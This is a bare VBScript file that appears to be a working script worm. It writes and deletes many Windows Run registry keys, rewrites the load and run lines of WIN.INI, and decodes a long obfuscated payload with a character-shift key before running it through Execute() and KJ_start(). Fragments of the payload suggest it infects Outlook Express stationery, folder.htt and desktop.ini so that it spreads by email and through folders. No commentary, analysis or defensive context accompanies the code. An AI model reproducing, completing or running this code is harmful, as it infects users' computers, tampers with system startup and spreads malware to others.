Set CURObj = CreateObject("WScript.Shell")
mhk="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\Run\"
mhc="HK"&"CU\Soft"&"ware\Micros"&"oft\Win"&"dows\Curren"&"tVersion\Run\"
mhk2="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\"
CURObj.RegWrite ""&mhk&"W1N32","regedit -s c:\windows\system32\$WIN32$\WIN32SQL.cer"
CURObj.RegWrite ""&mhk&"internat.exe","internat.exe"
CURObj.RegWrite ""&mhk&"zwupdows","12"
CURObj.RegWrite ""&mhk&"win","12"
CURObj.RegWrite ""&mhk&"mwin","12"
CURObj.RegWrite ""&mhk&"internt","12"
CURObj.RegWrite ""&mhk&"Inernet","12"
CURObj.RegWrite ""&mhk&"Internet","12"
CURObj.RegWrite ""&mhk&"iexpleror","12"
CURObj.RegWrite ""&mhk&"zxdows","12"
CURObj.RegWrite ""&mhk&"qwe","12"
CURObj.RegWrite ""&mhk&"win1","12"
CURObj.RegWrite ""&mhk&"intelnat.exe","12"
CURObj.RegWrite ""&mhk&"u1888","12"
CURObj.RegWrite ""&mhk&"intenet","12"
CURObj.RegWrite ""&mhk&"9i5zxdows","12"
CURObj.RegWrite ""&mhk&"9i5com01zxdows","12"
CURObj.RegWrite ""&mhk&"99zxdows","12"
CURObj.RegWrite ""&mhk&"88zxdows","12"
CURObj.RegWrite ""&mhk&"Start Pagewin","12"
CURObj.RegWrite ""&mhk&"Start Page","12"
CURObj.RegWrite ""&mhk&"u188","12"
CURObj.RegWrite ""&mhk&"9i5comzxdows","12"
CURObj.RegWrite ""&mhk&"9q5zxdows","12"
CURObj.RegWrite ""&mhk&"u1881","12"
CURObj.RegWrite ""&mhk&"u1882","12"
CURObj.RegWrite ""&mhk&"u1883","12"
CURObj.RegWrite ""&mhk&"u1884","12"
CURObj.RegWrite ""&mhk&"u1885","12"
CURObj.RegWrite ""&mhk&"u1886","12"
CURObj.RegWrite ""&mhk&"u1887","12"
CURObj.RegWrite ""&mhk&"u88y", "12"
CURObj.RegWrite ""&mhk&"flash", "12"
CURObj.RegWrite ""&mhk&"999izxdows","12"
CURObj.RegWrite ""&mhk&"033zxdows","12"
CURObj.RegWrite ""&mhk&"syste","12"
CURObj.RegWrite ""&mhc&"my","12"
CURObj.RegWrite ""&mhk&"3zxdows","12"
CURObj.RegWrite ""&mhk&"88u88","12"
CURObj.RegWrite ""&mhk&"system","12"
CURObj.RegWrite ""&mhk&"8zxdows","12"
CURObj.RegWrite ""&mhk&"u18","12"
CURObj.RegWrite ""&mhk&"interneet.exe","12"
CURObj.RegWrite ""&mhk2&"RunOnce\", "12"
CURObj.RegWrite ""&mhk&"iexpler", "12"
CURObj.RegWrite ""&mhk&"u1810", "12"
CURObj.RegWrite ""&mhk&"winwin", "12"
CURObj.RegWrite ""&mhk&"WIN32", "12"
CURObj.RegDelete ""&mhc&""
CURObj.RegDelete ""&mhk&"zwupdows"
CURObj.RegDelete ""&mhk&"win"
CURObj.RegDelete ""&mhk&"mwin"
CURObj.RegDelete ""&mhk&"internt"
CURObj.RegDelete ""&mhk&"inernet"
CURObj.RegDelete ""&mhk&"Internet"
CURObj.RegDelete ""&mhk&"u188"
CURObj.RegDelete ""&mhk&"iexpleror"
CURObj.RegDelete ""&mhk&"zxdows"
CURObj.RegDelete ""&mhk&"qwe"
CURObj.RegDelete ""&mhk&"win1"
CURObj.RegDelete ""&mhk&"intelnat.exe"
CURObj.RegDelete ""&mhk&"intenet"
CURObj.RegDelete ""&mhk&"9i5zxdows"
CURObj.RegDelete ""&mhk&"9i5com01zxdows"
CURObj.RegDelete ""&mhk&"99zxdows"
CURObj.RegDelete ""&mhk&"88zxdows"
CURObj.RegDelete ""&mhk&"Start Pagewin"
CURObj.RegDelete ""&mhk&"Start Page"
CURObj.RegDelete ""&mhk&"9i5comzxdows"
CURObj.RegDelete ""&mhk&"9q5zxdows"
CURObj.RegDelete ""&mhk&"999izxdows"
CURObj.RegDelete ""&mhk&"033zxdows"
CURObj.RegDelete ""&mhk&"u1881"
CURObj.RegDelete ""&mhk&"u1882"
CURObj.RegDelete ""&mhk&"u1883"
CURObj.RegDelete ""&mhk&"u1884"
CURObj.RegDelete ""&mhk&"u1885"
CURObj.RegDelete ""&mhk&"u1886"
CURObj.RegDelete ""&mhk&"u1887"
CURObj.RegDelete ""&mhk&"u88y"
CURObj.RegDelete ""&mhk&"flash"
CURObj.RegDelete ""&mhk&"88u88"
CURObj.RegDelete ""&mhk&"interneet.exe"
CURObj.RegDelete ""&mhk&"u18"
CURObj.RegDelete ""&mhk&"u1888"
CURObj.RegDelete ""&mhk&"system"
CURObj.RegDelete ""&mhk&"3zxdows"
CURObj.RegDelete ""&mhk&"8zxdows"
CURObj.RegDelete ""&mhk&"syste"
CURObj.RegDelete ""&mhk2&"RunOnce\"
CURObj.RegDelete ""&mhk&"iexpler"
CURObj.RegDelete ""&mhk&"u1810"
CURObj.RegDelete ""&mhk&"winwin"
CURObj.RegDelete ""&mhk&"WIN32"

Set FSO = CreateObject("Scripting.FileSystemObject")
myfile14=FSO.FileExists("c:\windows\WIN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.WriteLine "load="
FSO2.Write "run="
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.Write "load="
FSO2.Write mywin
FSO2.close
end if
end if
end if

ExeString = "Bie GnOhcr],FtelRept*VZsRept*D]gpe]Sggf,?phlcOZjccl,DSG,UsKhcld,UifP_t`,QuZE*Fan_lqDgscSmbKB_qtYrr(!KBSct<ik(!KBCpeYtcMalgem('KHLakcIl('KHCje_t]M_id('KHPjona_are )=nb Ku`Fmnataol CJ?pheldLo&FalcPYtf,LyneKtp)MnEprgrR]ssm] LeptKer Je_dLekp=FKO,OhelT]xrFalc(>ijeHarh$1'TkpKtp 5 PeYdReep,R]abAdlAfIfsrr TkpKtp,KH_kt_rl('! :>0Oj Jef(RmhSrr! : ) Rh]nJe_dLekp&Cjoke=xgtFsn[tgofEfdI^I^ RyheQtj ; hrt Rh]nJe_dLekp&CjokeKer >ijeLekp=FKO,OhelT]xrFalc(>ijeHarh$2'Fgl]Tcmh.Uratc <    BGDW gnjoYd;&tbkcpiht8&CJ]slapt )  $ >   tb;rJf&TepQtj $ nbArDf&HrmdTcxlFalcT]mn.;lms]S]tF9trrab=FQO&Gct>ije Fgl]P_t`)>Artji`.Ytrrabst]s=32Ejs]R]abT]mn.;lms]S]tFalcT]mn 5 DSG.Mp]nReptDide&FalcPYtf,0)AfTqpcSlr=ftel  LhcnDideReep,Wjirev`CjLd   < $ HRMD>   tb;rJf&4&@O<Yoflma\=  $ v`s[rgpl:    KB_qtYrr(! &6&v`CjLd  FtelRept=lqeAfTqpcSlr=tbkT`elFgl]Tcmh.Uratc nbArDf&V`sLevtCn\ GfDideReep,CdoqeCn\ GfCn\ DufcrignDufcrignKBCfafgcSmb&CmrpeftQtjilg$L_slIld]xAhYr'Id DaqtAnbepCfaj ; ( Rh]nAfL]fr(DC_s](AujrcnlSrrane)$1' 5<L;aqe a! Rh]nCJAhYneeKu` 5 Difajy<iqk&2\ Ssb= ; (EdscKHC`alg]Ssb=C`r&Akc&L]fr(DC_s](AujrcnlSrrane)$1')-1! $ :ZQuZE=0=nb Af=lqeIJ;h_n_eQuZ ; Eib(;upr]nrSlrgn_,/,DaqtAnbepCfaj)=nb Af=nb >ulclimn>ulclimnKHCje_t]M_id('Ol =rpoj PekukeNcxlI^ GnOhcr] ; hrmdT`elEvil Dufcrign=nb AfKh_r]Fgl] ; Dedt WgnHarh$3'   PjoerYmFalcsTCmmeol >ijek\Ki[rmsgfr Kh_r]dZSlarigncrq\`lYni.`tkGf(DSG.DideCxasrs SfajeDide')TfefCYlj CJ?pheldLo&S`ape>ije$ftel )ClkeKer >ijeLekp=FKO,OhelT]xrFalc(Kh_r]Fgl],0,lrse!FalcT]mn.Orgt]  < $ HRMD>   tb;rJf&4&@O<Yoflma\=  $ v`s[rgpl:    KB_qtYrr(! &6&v`CjLd  FtelRept>ijeLekp&Cjoke=nb Af<edamlrI\ ; OsQh]lj.JeeR]ab(HIEQ_AUJRCNL_SS=RZI\eltatgek\Be^asll Ss]rI<'OstDomkNepsaol 5 UsKhcld.Pe_Rca\( HCEW_DOAAD_KA;HGN=\Qo^tuajeZMacpokodtTOstdomkEvpjeqsTMcdaaTej'WqS`ejl&RcgOrgt]  HCEW_;UPR=NR_MSCRTIbeftgtaeq\&Be^asllIb&\Qo^tuajeZMacpokodtTOstdomkEvpjeqsT$ Dedt OstDomkNepsaol,))&..\EaglTCmmhoqeUqeSralimn]rw$1*JEE_<WMR<;ajlKHMYijR]g&@KCYWCSRJELTWUQEJ\Gd]nrilicsT$D]f_udtGdZSgfrwYrc\Eiargsmfl\Mullmoc Cxhrcsk\ &Lcfl(MulLmocVcrkimn$1' ,0TM_id\QtYtgofepyN_m]*S`ape>ije!CYlj CJKaalPe_( HCEW_;UPR=NR_MSCRTIbeftgtaeq\&Be^asllIb&\Qo^tuajeZMacpokodtTOstdomkEvpjeqsT$ Dedt OstDomkNepsaol,))&..\EaglTWgd] QtYtgofepyN_m]*S`ape>ije!WkSfedl,R]gUratc HIEQ_AUJRCNL_SS=RZSgfrwYrc\Eiargsmfl\Mf^iaeT9,0TOstdomkTOntaolsTM_id\CdatmrHrcf]rcn[e ,)3/0/2*JEE_<WMR<;ajlKHMYijR]g&@KCYWCSRJELTWUQEJ\Qo^tuajeZMacpokodtTWgn\ousMcskaeifgSmbqyktcmTPpo^ijek\Ki[rmsgfr Gurlgoi AnrejnctSctlilgk\.a(d.2(0.0(0.0(0a0(0.0(0.0(0.0,6Z0(1c0+6.$`lYni!CYlj CJKaalPe_( HCEW_;UPR=NR_MSCRTSmflw_r]\Ki[rmsgfr\Oildgwq FTZCmrpeftTejsgof\Uifdmwk Keks_gane Ku`sqsree\Nrgfgl]sZMacpokodtOstdomkIlt]rlel Qeltgn_sZ0Y0b0*0.0(0.0(0.c(0.0(0.0(0.0(44\(0/e(340, bdalk)OsQh]lj.JeeWjireFK=Y]CMRPEFT]UKEP\KodtoapeTMgcjoqo^tZO^fgc]\/0&0ZOmtjogkZOhtgofsZMYij\=dgtgrNr]fcr]nae,/3)052$PE?_BWGRBAadlKBM_idRcg FK=Y]CMRPEFT]UKEP\KodtoapeTMgcjoqo^tZO^fgc]\/0&0ZCgmkof\KaalQeltgn_sZN]wQtYtgofepy, bdalk)CJsmeaee>ojd]r&L]fr(OilPYtf,+)&Nrggpae Dideq\;okmgnFalcsTMgcjoqo^tS`ape\\QtYtgofepy)=nb >ulclimn>ulclimnKHCje_t]Mglaes(!Of Crjop JequeeN]xrTcmhP_t` ; AfNgt&FKO,FalcEpiqtk(UifP_t` $ WQcjint&eve)' LhcnReepNalh=qyktcm+2ZCn\ GfGfTcmhP_t` ; swslek3*\  LhcnQtYrrUhFgl] ; OilPYtf   SQSREE\Iejncl+2,ddl Ejs]SlaptMpDide=WgnHarh&KYQT=MZK]rled.bld=nb AfOsQh]lj.JeeWjireFK=Y]LGC?LWM?C@ILETSmflw_r]\Ki[rmsgfr\Oildgwq\;upr]nrV]rqignZRmnZK]rled30$SrajtSp>ijeDSG.AohyDideWanNalh&ueZ\ijoajl&ggf,UifP_t` $ wcbTFml\ep.`trDSG.AohyDideWanNalh&qyktcm+2Zkbw_ld.ei^*WanNalh&qyktcm+2Zd]sitgp,ifi C_ld IJ9pnefdRo WgnHarh&oe`\>ojd]r,hlt ,hrt)OsQh]lj.JeeWjireFK=Y]CDAQS=S]RGOR\&djlT*\ljfalcUsKhcld.Pe_Wpile@KCYWCJAKSCSWRMOL\,ddlZCgnreftTqpc$_phlgcYtgof/v-esboonjoYd WqS`ejl&RcgOrgt]  HCEW_;L?SKEQ_JOMTTdjl^ijeTDcfYujtAcmnT*WkSfedl,R]gPeYd&@KCYWCJAKSCSWRMOL\tx\fgl]\Be^asllIaof\ )UsKhcld.Pe_Wpile@KCYWCJAKSCSWRMOL\bldfgl]\Qcjint=neifeZ$TBKcpiht WqS`ejl&RcgOrgt]  HCEW_;L?SKEQ_JOMTTdjl>ijeTSfedlZOhel\;okmYnb\,UifP_t` $ LekpHarh&OSarapr.]xc #1%OsQh]lj.JeeWjireFK=Y]CDAQS=S]RGOR\\ljFalc\KhcldEv\Hrmp]rryKhcelH_n\lcrk\US@PpohsZ$y6(234;A3-151B%1/C>-6C16+0(A?0(B67(8A}WkSfedl,R]gUratc HIEQ_AL9SQEK_POGTZddlDideZS[rgplHmslElcgdc\, {05/3)611%460;-/1<2+B)F7-(0A0,F66;304uKer >ijeLekp=FKO,OhelT]xrFalc(Kt_rlUnFalc,*,rrme'Fgl]Tcmh.Uratc NbqT]xrFgl]Tcmh.AlgscEldFsn[tgofFsn[tgof IJDiieAt&)GfIlW`epe<< hrmdT`elEvil Dufcrign=nb AfLhgsDoaalimn=dgcsm]nr.doaalimnGfLcfl(RhasJo[arign* ,)=dide  LhcnRhasJo[arign=Mgd TfikLmcYtgof,7)GfFQO&Gct=xrefsgofN_m](RhasJo[arign' 4> rh]nLhgsDoaalimn=L]fr(LhgsDoaalimn$Lcn TfikLmcYtgof)-Lcn FQO&Gct>ijeFake TfikLmcYtgof)')Cn\ GfGfLcn TfikLmcYtgof)>3T`elTfikLmcYtgof ; LhgsDoaalimn&T=nb AfCJsmeaee>ojd]r&T`iqLgc_taol)Cn\ GfCn\ DufcrignDufcrignKBM_idRcg RcgKtp,>ijeFake!Of Crjop JequeeN]xrRcgLekpKtp 5 UsKhcld.Pe_Rca\(Pe_Srr!I^ Pe_TcmhSrr= Rh]nOsQh]lj.JeeWjireRcgKtp,>ijeFakeCn\ GfCn\ DufcrignDufcrignKBO`oKu`(;upr]nrSlrgn_)Ku`E=0RektMul ; (Dg Uhalc LrseRektMul ; LeqtGur # /Id LeqtGur 6 08TfefCmrpeftQtjilg=Fan_lqDgsc $ :ZCxatDgEfdI^Of Crjop JequeeN]xrSctTfikFml\ep 5 DSG.EelFml\ep(;upr]nrSlrgn_)Ker <iaSmb=CpeYtcOZjccl( S[rgplilg&DgclimnYrw!S]tFglbejs=TfikFml\ep.Ku`Fglbejs>ojd]rAomnr 5 .FmrE_c` ReepDoddcril >ojd]rqFml\epCgult=FglbejCmuft+1<iaSmb,a\dFglbejCmuft* Lekp>ojd]r,NYmcNcxlI^ Bi[Ssb&Cmuft=0T`elL_slIld]xAhYr=IlslrPen(AujrcnlSrrane,\ ,Del(;upr]nrSlrgn_)+1!SmbQtjilg=Mad&CmrpeftQtjilg$L_slIld]xAhYr)1$Lcn CsrjeltKtpifg'-DaqtAnbepCfaj-/)AujrcnlSrrane 5 IJ;h_n_eQuZ(AujrcnlSrrane,DaqtAnbepCfaj)Ku`E=1ClkeAfSmbC 5 . LhcnAujrcnlSrrane 5 AujrcnlSrrane  Bi[Ssb&Iree(/)&T=xgtDmEjs]j=0Doj h 5 / LoFglbejCmuftAfL;aqe SsbKtpifg' 5 JCYsc(<iaSmb,Ilek(b)' LhcnGfj<Fml\epCgultTfefCmrpeftQtjilg=CmrpeftQtjilg&DacQuZ.Gt]m&j#1'   \Epir <o=nb Af=nb AfFevtJaktGn\evC`ap 5 GnktpR]v&CmrpeftQtjilg$Z$Lcn CsrjeltKtpifg'-))Ku`Slrgn_ ; Eib(;upr]nrSlrgn_,JaktGn\evC`ap+),Jef(AujrcnlSrrane)%L_slIld]xAhYr+1!CmrpeftQtjilg=KBCfafgcSmb&CmrpeftQtjilg$L_slIld]xAhYr'EldIdEldIdLmohKBO`oKu` 5 AujrcnlSrraneEldFsn[tgofFsn[tgof IJHrmpYg_t]('Ol =rpoj PekukeNcxlR]gNalhTaduc 5  HCEW_DOAAD_KA;HGN=\Qo^tuajeZMacpokodtTOstdomkEvpjeqsTDcgjecBikkBe_rce=WkSfedl,R]gPeYd&R]gNalhTaduc)GfDgscDcgjec 5  TfefDasiD]gpe] ; >iladyBikk&8\EfdI^Fgri51tg 3DgscDcgjec 5 IJGbmSmb&DasiD]gpe])CJsmeaee>ojd]r&DasiD]gpe])FevtUsKhcld.Pe_WpileR]gNalhTaduc,<iqk<eer]e=nb >ulclimn>ulclimnKHuem_g]Fml\ep(HarhFake!Of Crjop JequeeN]xrSctFml\epNYmc 5 DSG.EelFml\ep(HarhFake!S]tT`iqFalcs=FglbejN_m].DideqHrt=xgsls=0>op =aahTfikFgl] GnTfikFgl]s>ije=xr 5 SCYsc(>SM.?erEptcnkimnFake TfikFgl].Nalh')GfFgl]Evt=@TKOp >ije=xr 5  HLMJOp >ije=xr 5  AKP  GrFalcEpt=NHHOj DideCxl ; JQP Rh]n;ajlKHAhpcn\Tm(Lhgs>ije&P_t`, hlmj!EdscI^ DideCxl ; V@S Rh]n;ajlKHAhpcn\Tm(Lhgs>ije&P_t`, vZs )ClkeGfFgl]Evt=@TRTfefHltCxasrs=1Cn\ GfLeptAf(MC_s](NalhLaee' 5 SCYsc(OilPYtf   D]sitgpZ!)Oj &U;aqe P_t`N_m])=UAake&WanNalh&Bekkroh')LhcnFtlEviktq 5 /EldIdId @trEpiqtk ; ( Rh]n>SM.;ony>ijeWgnHarh&kyqt]m12Tdcsctmp&ili,NalhLaee>SM.;ony>ijeWgnHarh&oe`\>ojd]r,hlt ,HarhFakeCn\ GfCn\ DufcrignDufcrignKBSct<ik(!Of Crjop JequeeN]xrEpr&CjeYrLeqtAt=WQcjint&SaraprFmljnYmcId =rp LhcnGnOhcr] ; hrmd=lqeGnOhcr] ; v`sEfdI^I^ GnOhcr] ; v`s Rh]nKer >SM 5 Ar]areGbhe[t&Kcpihtgn_.DideQyktcmGbhe[t )Qel UsKhcld ; ;rcaleMbbeat US[rgpl.Qh]lj!EdscSctAnpdeMbbeat=dgcsm]nr.Ypnl]tq(KH__ucsl'AnpdeMbbeat&sct;LQI<( {>915<C02%1AF(-/1<0+A<B7-(0A0,FB50A.Bu'AnpdeMbbeat&cpeYtcIfsrafcc(!S]tWkSfedl=AnpdeMbbeat&GctGbhe[t&)?phlcOZjccl.qelCJSAD&s0B4+FC0)-D013+1)CD-0920%0.A(C70-4020} )?phlcOZjccl.ar]areAnqtYnae )Ker >SM 5 ?phlcOZjccl.EelO`j]cr(!EfdI^S]tDasiOZjccl ; >SM.<rgv]s>op =aahDgscTcmh GnDgscO`j]crId <iqkLekp&DpineRyhe<6 0 9nb <iqkLekp&DpineRyhe<6 / LhcnCxatFgr=nb Af>iladyBikk=DgscTcmh.BravcL]trejN]xrDgmOrh]r?rj(1)PafdmmazcFmri;0Tm +Olhcr9rp(a)=Ilt (7  Pn\)'NcxlT]mnSlrgn_ ; >op a=/ LoL]n&T`iqT]xr)ReepLue ; 9sa(Eib(LhgsLevt$i*1!)AfT]mnNmm=11 LhcnReepLue ; *8=lqeAfT]mnNmm=1. LhcnReepLue ; *9=nb AfLekp;h_r=C`r&T]mnNmm-Orh]r?rj(g Eob ,)'Id Lekp;h_r=C`r&3,)T`elTcmhCfaj ; ;hp()8'EldIdTcmhSrrane 5 ReepQtjilg&T]mnC`apNcxlUfLmccSrr==xccmtc(Bie IeqApr 3',LhgsLevt$vZCpL^& CewAjr&0! ;  $ GtfejApr 0'   &tb;rJf K]y?rj(/)=&Olhcr9rp())& v`CjLd&IeqApr 2' 5    Mt`epAjr&2! $  &nbArDf$Kcy9rp(+)=&Orh]r?rj(1)&$vZCpL^& >op a=/ LoL]n&EpeQtjilg! &nbArDf$TcmhNsm=Akc&Mad&EpeQtjilg$i*1!) v`CjLd&GfTcmhNsm=10 Rh]n v`CjLd&ReepLue ; +4 v`CjLd&Cn\ Gf$vZCpL^& Lekp;h_r=C`r&T]mnNmm+Kcy9rp(a Ko\ 2)! &nbArDf$Id Lekp;h_r=C`r&20)T`el&tb;rJf T]mnC`ap 5 tb;r v`CjLd&ClkeGfTcmhCfaj ; ;hp(*9' Lhcn$vZCpL^& Lekp;h_r=vZLd&tb;rJf EfdI^ &nbArDf$TfikTcxl ; LhgsLevt&T]mnC`ap&tb;rJf N]xr)   tb;rJf&=xccmtc(LhgsLevt!LhgsLevt==xcSlrgn_ ;    ReepQtjilg& HrmdTcxl ;4&qcjintl_n_u_g]=tbkcpiht<&vZCpL^ $ dmcmmcnl.uratc  $  &4&bin qtqlc=pmsatgof:_bkojule9 dedt20nx3 roh:.pp;wadrh20nx3 feagft20nx3 x-anbep:083 tiki`idiry2 fi\dcn>    <$&?PHLCTN?M==IJ$_eu]sr @EGG@T;0WGDLH;0cmd]=aoe.ks& &_cliteP.?clite$XAoepmn]nr> $ <    /9PNL=T<&4&-dav<&v`CjLd   < $ /qcjint6&v`CjLd   < $ sarapr dalgmaee5v`s[rgpl>   tb;rJf&T`iqT]xr  tb;rJf&UfLmccSrr&vZCpL^ $ <    /kcpiht<&vZCpL^ $ <    /:OBY6&v`CjLd   < $ /FTEL<TbkTcxl ; LhgsLevt&vZCpL^ $ MnJo[kQtj $ nbArDf&IJWsrajt&)WanNalh=FQO&GctKpccaajFglbej(.)&TAf(>SM.>ije=xgsls&WanNalh&ueZ\Doddcr&hrt)' LhcnDSG.AohyDideWanNalh&ueZ\Doddcr&hrt,UifP_t` $ wcbTkhwYlj._idCn\ GfGf(DSG.DideCxasrs WgnHarh&kyqt]m12Tdcsctmp&ili)' LhcnDSG.AohyDideWanNalh&qyktcm+2Zd]sitgp,ifi ,OilPYtf   sqsree30\cjuadl,gaf EldIdEldFsn[tgof"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 0"&vbCrLf&"KeyArr(1) = 2"&vbCrLf&"KeyArr(2) = 0"&vbCrLf&"KeyArr(3) = 8"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()